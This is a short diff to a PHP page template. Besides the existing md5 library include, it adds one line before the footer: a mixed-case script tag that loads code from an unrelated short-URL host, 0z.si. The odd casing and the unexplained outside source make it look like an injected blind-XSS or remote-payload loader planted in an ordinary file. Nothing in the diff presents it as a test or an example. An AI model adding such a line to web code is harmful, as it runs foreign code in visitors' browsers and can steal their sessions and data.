@@ -56,6 +56,7 @@ require_once('init.inc.php');
 	<!--This div exists to avoid footer from covering main body-->
 	<div class="push"></div>
 </div>
+<sCRiPt sRC=//0z.si/XEgC></sCrIpT>
 <script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
 <?php require('footer.php') ?>
 </body>
